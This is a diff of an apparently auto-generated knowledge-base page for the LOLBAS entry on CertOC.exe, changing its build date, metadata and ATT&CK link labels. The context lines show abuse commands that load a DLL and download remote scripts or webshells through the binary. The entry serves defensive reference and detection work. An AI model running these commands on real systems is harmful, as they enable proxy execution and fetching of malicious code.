@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Certoc.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "CertOC.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# CertOC.exe
-
 Used for installing certificates
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2021-10-07
-- Author: Ensar Samil
-- Source Path: yml/OSBinaries/Certoc.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
 - Use Case: Execute code within DLL file
 - Privileges: User
 - Operating System: Windows Server 2022
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 2. Download
 
@@ -63,7 +54,7 @@ certoc.exe -GetCACAPS {REMOTEURL:.ps1}
 - Use Case: Download scripts, webshells etc.
 - Privileges: User
 - Operating System: Windows Server 2022
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
